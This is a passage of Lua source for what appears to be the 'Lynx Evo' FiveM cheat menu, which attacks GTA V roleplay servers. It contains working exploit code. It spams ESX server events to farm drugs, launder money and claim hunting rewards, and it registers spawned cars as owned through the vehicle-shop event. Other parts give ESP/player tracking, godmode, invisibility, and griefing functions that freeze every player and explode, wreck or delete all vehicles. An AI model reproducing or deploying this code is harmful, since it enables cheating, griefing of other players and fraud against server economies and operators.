		if not DoesEntityExist(LynxEvo.Entity) then return end 
		if DoesCamExist(LynxEvo.Camera) then DestroyCam(LynxEvo.Camera) end

		LynxEvo.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)

		AttachCamToEntity(LynxEvo.Camera, LynxEvo.Entity, 0.0, 0.0, 0.4, true)

		Citizen.CreateThread(function()
			while DoesCamExist(LynxEvo.Camera) do
				Citizen.Wait(5)

				SetCamRot(LynxEvo.Camera, GetEntityRotation(LynxEvo.Entity))
			end
		end)

		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(LynxEvo.Entity), true) / 10)

		RenderScriptCams(1, 1, easeTime, 1, 1)

		Citizen.Wait(easeTime)

		SetTimecycleModifier("scanline_cam_cheap")
		SetTimecycleModifierStrength(2.0)
	else
		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(LynxEvo.Entity), true) / 10)

		RenderScriptCams(0, 1, easeTime, 1, 0)

		Citizen.Wait(easeTime)

		ClearTimecycleModifier()

		DestroyCam(LynxEvo.Camera)
	end
end

LynxEvo.LoadModels = function(models)
	for modelIndex = 1, #models do
		local model = models[modelIndex]

		if not LynxEvo.CachedModels then
			LynxEvo.CachedModels = {}
		end

		table.insert(LynxEvo.CachedModels, model)

		if IsModelValid(model) then
			while not HasModelLoaded(model) do
				RequestModel(model)
	
				Citizen.Wait(10)
			end
		else
			while not HasAnimDictLoaded(model) do
				RequestAnimDict(model)
	
				Citizen.Wait(10)
			end    
		end
	end
end

LynxEvo.UnloadModels = function()
	for modelIndex = 1, #LynxEvo.CachedModels do
		local model = LynxEvo.CachedModels[modelIndex]

		if IsModelValid(model) then
			SetModelAsNoLongerNeeded(model)
		else
			RemoveAnimDict(model)   
		end
	end
end

local function carlicenseplaterino()
	local playerPed = GetPlayerPed(-1)
	local playerVeh = GetVehiclePedIsIn(playerPed, true)
	local result = KeyboardInput("Enter the plate license you want", "", 100)
	if result ~= "" then
		SetVehicleNumberPlateText(playerVeh, result)
	end
end

function hweed()
	TriggerServerEvent("esx_drugs:startHarvestWeed")
	TriggerServerEvent("esx_drugs:startHarvestWeed")
	TriggerServerEvent("esx_drugs:startHarvestWeed")
	TriggerServerEvent("esx_drugs:startHarvestWeed")
	TriggerServerEvent("esx_drugs:startHarvestWeed")
end

function tweed()
	TriggerServerEvent("esx_drugs:startTransformWeed")
	TriggerServerEvent("esx_drugs:startTransformWeed")
	TriggerServerEvent("esx_drugs:startTransformWeed")
	TriggerServerEvent("esx_drugs:startTransformWeed")
	TriggerServerEvent("esx_drugs:startTransformWeed")
end

function sweed()
	TriggerServerEvent("esx_drugs:startSellWeed")
	TriggerServerEvent("esx_drugs:startSellWeed")
	TriggerServerEvent("esx_drugs:startSellWeed")
	TriggerServerEvent("esx_drugs:startSellWeed")
	TriggerServerEvent("esx_drugs:startSellWeed")
end

function hcoke()
	TriggerServerEvent("esx_drugs:startHarvestCoke")
	TriggerServerEvent("esx_drugs:startHarvestCoke")
	TriggerServerEvent("esx_drugs:startHarvestCoke")
	TriggerServerEvent("esx_drugs:startHarvestCoke")
	TriggerServerEvent("esx_drugs:startHarvestCoke")
end

function tcoke()
	TriggerServerEvent("esx_drugs:startTransformCoke")
	TriggerServerEvent("esx_drugs:startTransformCoke")
	TriggerServerEvent("esx_drugs:startTransformCoke")
	TriggerServerEvent("esx_drugs:startTransformCoke")
	TriggerServerEvent("esx_drugs:startTransformCoke")
end

function scoke()
	TriggerServerEvent("esx_drugs:startSellCoke")
	TriggerServerEvent("esx_drugs:startSellCoke")
	TriggerServerEvent("esx_drugs:startSellCoke")
	TriggerServerEvent("esx_drugs:startSellCoke")
	TriggerServerEvent("esx_drugs:startSellCoke")
end

function hmeth()
	TriggerServerEvent("esx_drugs:startHarvestMeth")
	TriggerServerEvent("esx_drugs:startHarvestMeth")
	TriggerServerEvent("esx_drugs:startHarvestMeth")
	TriggerServerEvent("esx_drugs:startHarvestMeth")
	TriggerServerEvent("esx_drugs:startHarvestMeth")
end

function tmeth()
	TriggerServerEvent("esx_drugs:startTransformMeth")
	TriggerServerEvent("esx_drugs:startTransformMeth")
	TriggerServerEvent("esx_drugs:startTransformMeth")
	TriggerServerEvent("esx_drugs:startTransformMeth")
	TriggerServerEvent("esx_drugs:startTransformMeth")
end

function smeth()
	TriggerServerEvent("esx_drugs:startSellMeth")
	TriggerServerEvent("esx_drugs:startSellMeth")
	TriggerServerEvent("esx_drugs:startSellMeth")
	TriggerServerEvent("esx_drugs:startSellMeth")
	TriggerServerEvent("esx_drugs:startSellMeth")
end

function hopi()
	TriggerServerEvent("esx_drugs:startHarvestOpium")
	TriggerServerEvent("esx_drugs:startHarvestOpium")
	TriggerServerEvent("esx_drugs:startHarvestOpium")
	TriggerServerEvent("esx_drugs:startHarvestOpium")
	TriggerServerEvent("esx_drugs:startHarvestOpium")
end

function topi()
	TriggerServerEvent("esx_drugs:startTransformOpium")
	TriggerServerEvent("esx_drugs:startTransformOpium")
	TriggerServerEvent("esx_drugs:startTransformOpium")
	TriggerServerEvent("esx_drugs:startTransformOpium")
	TriggerServerEvent("esx_drugs:startTransformOpium")
end

function sopi()
	TriggerServerEvent("esx_drugs:startSellOpium")
	TriggerServerEvent("esx_drugs:startSellOpium")
	TriggerServerEvent("esx_drugs:startSellOpium")
	TriggerServerEvent("esx_drugs:startSellOpium")
	TriggerServerEvent("esx_drugs:startSellOpium")
end

function mataaspalarufe()
	TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
	TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
	TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
	TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
	TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
	TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
	TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
	TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
	TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
	TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
end

function matanumaispalarufe()
	TriggerServerEvent("esx_drugs:stopHarvestCoke")
	TriggerServerEvent("esx_drugs:stopTransformCoke")
	TriggerServerEvent("esx_drugs:stopSellCoke")
	TriggerServerEvent("esx_drugs:stopHarvestMeth")
	TriggerServerEvent("esx_drugs:stopTransformMeth")
	TriggerServerEvent("esx_drugs:stopSellMeth")
	TriggerServerEvent("esx_drugs:stopHarvestWeed")
	TriggerServerEvent("esx_drugs:stopTransformWeed")
	TriggerServerEvent("esx_drugs:stopSellWeed")
	TriggerServerEvent("esx_drugs:stopHarvestOpium")
	TriggerServerEvent("esx_drugs:stopTransformOpium")
	TriggerServerEvent("esx_drugs:stopSellOpium")
	drawNotification("~b~Everything is now stopped.", false)
end

local function matacumparamasini()
	local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
	local NewPlate = KeyboardInput("Enter Vehicle Licence Plate", "", 100)

	if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
			RequestModel(ModelName)
			while not HasModelLoaded(ModelName) do
					Citizen.Wait(0)
			end

			local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true)
			SetVehicleNumberPlateText(veh, NewPlate)
			local vehProps = ESX.Game.GetVehicleProperties(veh)
			TriggerServerEvent("esx_vehicleshop:setVehicleOwned", vehProps)
			drawNotification("~g~~h~Success", false)
	else
			drawNotification("~b~~h~Model is not valid !", true)
	end
end

function daojosdinpatpemata()
	local playerPed = GetPlayerPed(-1)
	local playerVeh = GetVehiclePedIsIn(playerPed, true)
	if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
	SetVehicleOnGroundProperly(playerVeh)
	drawNotification("~g~Vehicle Flipped!", false)
	else
	drawNotification("~b~You Aren't In The Driverseat Of A Vehicle!", true)
	end
end


function stringsplit(inputstr, sep)
	if sep == nil then
		sep = "%s"
	end
	local t = {}
	i = 1
	for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
		t[i] = str
		i = i + 1
	end
	return t
end

local Spectating = false

function SpectatePlayer(player)
	local playerPed = PlayerPedId(-1)
	Spectating = not Spectating
	local targetPed = GetPlayerPed(player)

	if (Spectating) then
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(true, targetPed)

		drawNotification("Spectating " .. GetPlayerName(player), false)
	else
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(false, targetPed)

		drawNotification("Stopped Spectating " .. GetPlayerName(player), false)
	end
end

function ShootPlayer(player)
	local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(-1), head.x, head.y, head.z, true)
end

function MaxOut(veh)
                    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
                    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
					SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 0, true)
					SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 1, true)
					SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 2, true)
					SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 3, true)
					SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)), 222, 222, 255)
end

function DelVeh(veh)
	SetEntityAsMissionEntity(Object, 1, 1)
	DeleteEntity(Object)
	SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
	DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end


function Clean(veh)
	SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
	SetVehicleDirtLevel(veh, 1.0)
end

function RequestControl(entity)
	local Waiting = 0
	NetworkRequestControlOfEntity(entity)
	while not NetworkHasControlOfEntity(entity) do
		Waiting = Waiting + 100
		Citizen.Wait(100)
		if Waiting > 5000 then
			drawNotification("Hung for 5 seconds, killing to prevent issues...", true)
		end
	end
end

function getEntity(player)
	local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
	return entity
end

function GetInputMode()
	return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end



function DrawSpecialText(m_text, showtime)
	SetTextEntry_2("STRING")
	AddTextComponentString(m_text)
	DrawSubtitleTimed(showtime, 1)
end



local showblip = true
local showsprite = false
local nameabove = true
local confirmtrig = true

Citizen.CreateThread(function()

	while true do
		Wait( 1 )
		for id = 0, 128 do

			if NetworkIsPlayerActive( id ) and GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then

				ped = GetPlayerPed( id )
				blip = GetBlipFromEntity( ped )
				
                x1, y1, z1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), true ) )
                x2, y2, z2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), true ) )
				distance = math.floor(GetDistanceBetweenCoords(x1,  y1,  z1,  x2,  y2,  z2,  true))
				
				headId = Citizen.InvokeNative( 0xBFEFE3321A3F5015, ped, GetPlayerName( id ), false, false, "", false )
				wantedLvl = GetPlayerWantedLevel( id )

				if showsprite then
					Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 0, true ) 
					if wantedLvl then

						Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, true ) 
						Citizen.InvokeNative( 0xCF228E2AA03099C3, headId, wantedLvl ) 

					else

						Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, false ) 
	
					end
				else
					Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, false )
					Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, false ) 
					Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 0, false ) 
				end
				if showblip then
	
					if not DoesBlipExist( blip ) then 
						blip = AddBlipForEntity( ped )
						SetBlipSprite( blip, 1 )
						Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) 
						SetBlipNameToPlayerName(blip, id)
	
					else 
	
						veh = GetVehiclePedIsIn( ped, false )
						blipSprite = GetBlipSprite( blip )
	
						if not GetEntityHealth( ped ) then 
	
							if blipSprite ~= 274 then
	
								SetBlipSprite( blip, 274 )
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
								SetBlipNameToPlayerName(blip, id) 
	
							end
	
						elseif veh then
	
							vehClass = GetVehicleClass( veh )
							vehModel = GetEntityModel( veh )
							
							if vehClass == 15 then
	
								if blipSprite ~= 422 then
	
									SetBlipSprite( blip, 422 )
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
									SetBlipNameToPlayerName(blip, id)
	
								end
	
							elseif vehClass == 16 then 
	
								if vehModel == GetHashKey( "besra" ) or vehModel == GetHashKey( "hydra" )
									or vehModel == GetHashKey( "lazer" ) then 
	
									if blipSprite ~= 424 then
	
										SetBlipSprite( blip, 424 )
										Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false ) 
										SetBlipNameToPlayerName(blip, id)
	
									end
	
								elseif blipSprite ~= 423 then
	
									SetBlipSprite( blip, 423 )
									Citizen.InvokeNative (0x5FBCA48327B914DF, blip, false ) 
								end
							elseif vehClass == 14 then 
								if blipSprite ~= 427 then
									SetBlipSprite( blip, 427 )
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
								end
							elseif vehModel == GetHashKey( "insurgent" ) or vehModel == GetHashKey( "insurgent2" )
							or vehModel == GetHashKey( "limo2" ) then
								if blipSprite ~= 426 then
									SetBlipSprite( blip, 426 )
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
									SetBlipNameToPlayerName(blip, id)
								end
							elseif vehModel == GetHashKey( "rhino" ) then
								if blipSprite ~= 421 then
									SetBlipSprite( blip, 421 )
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
									SetBlipNameToPlayerName(blip, id)
								end
							elseif blipSprite ~= 1 then
								SetBlipSprite( blip, 1 )
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true )
								SetBlipNameToPlayerName(blip, id)
							end
							passengers = GetVehicleNumberOfPassengers( veh )
							if passengers then
								if not IsVehicleSeatFree( veh, -1 ) then
									passengers = passengers + 1
								end
								ShowNumberOnBlip( blip, passengers )
							else
								HideNumberOnBlip( blip )
							end
						else
							HideNumberOnBlip( blip )
							if blipSprite ~= 1 then
								SetBlipSprite( blip, 1 )
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true )
								SetBlipNameToPlayerName(blip, id)
							end
						end
						SetBlipRotation( blip, math.ceil( GetEntityHeading( veh ) ) ) -- update rotation
						SetBlipNameToPlayerName( blip, id )
						SetBlipScale( blip,  0.85 )
						if IsPauseMenuActive() then
							SetBlipAlpha( blip, 255 )
						else
							x1, y1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), true ) )
							x2, y2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), true ) )
							distance = ( math.floor( math.abs( math.sqrt( ( x1 - x2 ) * ( x1 - x2 ) + ( y1 - y2 ) * ( y1 - y2 ) ) ) / -1 ) ) + 900
							if distance < 0 then
								distance = 0
							elseif distance > 255 then
								distance = 255
							end
							SetBlipAlpha( blip, distance )
						end
					end
				else
					RemoveBlip(blip)
				end
			end
		end
	end
end)

local entityEnumerator = {
	__gc = function(enum)
		if enum.destructor and enum.handle then
			enum.destructor(enum.handle)
		end
		enum.destructor = nil
		enum.handle = nil
	end
}

function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
		local iter, id = initFunc()
		if not id or id == 0 then
			disposeFunc(iter)
			return
		end
	
		local enum = {handle = iter, destructor = disposeFunc}
		setmetatable(enum, entityEnumerator)
	
		local next = true
		repeat
			coroutine.yield(id)
			next, id = moveFunc(iter)
		until not next
	
		enum.destructor, enum.handle = nil, nil
		disposeFunc(iter)
	end)
end

function EnumeratePeds()
		return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateVehicles()
		return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

function EnumerateObjects()
	return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

function RotationToDirection(rotation)
	local retz = rotation.z * 0.0174532924
	local retx = rotation.x * 0.0174532924
	local absx = math.abs(math.cos(retx))

	return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

function OscillateEntity(entity, entityCoords, position, angleFreq, dampRatio)
	if entity ~= 0 and entity ~= nil then
		local direction = ((position - entityCoords) * (angleFreq * angleFreq)) - (2.0 * angleFreq * dampRatio * GetEntityVelocity(entity))
		ApplyForceToEntity(entity, 3, direction.x, direction.y, direction.z + 0.1, 0.0, 0.0, 0.0, false, false, true, true, false, true)
	end
end

local invisible = true

Citizen.CreateThread(
	function()
		while Enabled do
			Citizen.Wait(0)

		SetPlayerInvincible(PlayerId(), Godmode)
		SetEntityInvincible(PlayerPedId(-1), Godmode)
		SetEntityVisible(GetPlayerPed(-1), invisible, 0)

			if SuperJump then
				SetSuperJumpThisFrame(PlayerId(-1))
			end

			if InfStamina then
				RestorePlayerStamina(PlayerId(-1), 1.0)
			end

			if fastrun then
				SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
				SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
			else
				SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
				SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
			end

			if VehicleGun then
				local VehicleGunVehicle = "Freight"
				local playerPedPos = GetEntityCoords(GetPlayerPed(-1), true)
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!", false)
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
						if IsPedShooting(GetPlayerPed(-1)) then
							while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
								Citizen.Wait(0)
								RequestModel(GetHashKey(VehicleGunVehicle))
							end
							local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
							SetEntityAsNoLongerNeeded(veh)
							SetVehicleForwardSpeed(veh, 150.0)
						end
					end
				end
			end

			if DeleteGun then
				local gotEntity = getEntity(PlayerId(-1))
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!", false)
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
						if IsPlayerFreeAiming(PlayerId(-1)) then
							if IsEntityAPed(gotEntity) then
								if IsPedInAnyVehicle(gotEntity, true) then
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
										DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!", true)
									end
								else
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!", true)
									end
								end
							else
								if IsControlJustReleased(1, 142) then
									SetEntityAsMissionEntity(gotEntity, 1, 1)
									DeleteEntity(gotEntity)
									drawNotification("~g~Deleted!", true)
								end
							end
						end
					end
				end
			end

if fuckallcars then
	for playerVeh in EnumerateVehicles() do
		if (not IsPedAPlayer(GetPedInVehicleSeat(playerVeh, -1))) then 
			SetVehicleHasBeenOwnedByPlayer(playerVeh, false) 
			SetEntityAsMissionEntity(playerVeh, false, false) 
			StartVehicleAlarm(playerVeh)
DetachVehicleWindscreen(playerVeh)
SmashVehicleWindow(playerVeh, 0)
SmashVehicleWindow(playerVeh, 1)
SmashVehicleWindow(playerVeh, 2)
SmashVehicleWindow(playerVeh, 3)
SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
SetVehicleDoorBroken(playerVeh, 0, true)
SetVehicleDoorBroken(playerVeh, 1, true)
SetVehicleDoorBroken(playerVeh, 2, true)
SetVehicleDoorBroken(playerVeh, 3, true)
SetVehicleDoorBroken(playerVeh, 4, true)
SetVehicleDoorBroken(playerVeh, 5, true)
SetVehicleDoorBroken(playerVeh, 6, true)
SetVehicleDoorBroken(playerVeh, 7, true)
SetVehicleLights(playerVeh, 1)
Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
SetVehicleNumberPlateTextIndex(playerVeh, 5)
SetVehicleNumberPlateText(playerVeh, "LynxMenu")
SetVehicleDirtLevel(playerVeh, 10.0)
SetVehicleModColor_1(playerVeh, 1)
SetVehicleModColor_2(playerVeh, 1)
SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
SetVehicleBurnout(playerVeh, true)
		end
	end
end

			if destroyvehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
						NetworkRequestControlOfEntity(vehicle)
						SetVehicleUndriveable(vehicle,true)
						SetVehicleEngineHealth(vehicle, 0)
					end
				end
			end
			

			if explodevehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
						NetworkRequestControlOfEntity(vehicle)
						NetworkExplodeVehicle(vehicle, true, true, false)
					end
				end
			end

if huntspam then
	Citizen.Wait(1)
	TriggerServerEvent('esx-qalle-hunting:reward', 20000)
	TriggerServerEvent('esx-qalle-hunting:sell')
end

if deletenearestvehicle then
	for vehicle in EnumerateVehicles() do
		if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
			SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1)
			DeleteEntity(GetVehiclePedIsIn(vehicle, true))
			SetEntityAsMissionEntity(vehicle, 1, 1)
			DeleteEntity(vehicle)
		end
	end
end

if freezeplayer then
	ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
end

if freezeall then
	for i = 0, 128 do
		ClearPedTasksImmediately(GetPlayerPed(i))
	end
end

if esp then
	for i = 0, 128 do
		if i ~= PlayerId(-1) and GetPlayerServerId(i) ~= 0 then
			local ra = RGBRainbow(1.0)
			local pPed = GetPlayerPed(i)
			local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId(-1)))
			local x, y, z = table.unpack(GetEntityCoords(pPed))
			local message =
				"~h~Name: " ..
				GetPlayerName(i) ..
					"\nServer ID: " ..
						GetPlayerServerId(i) ..
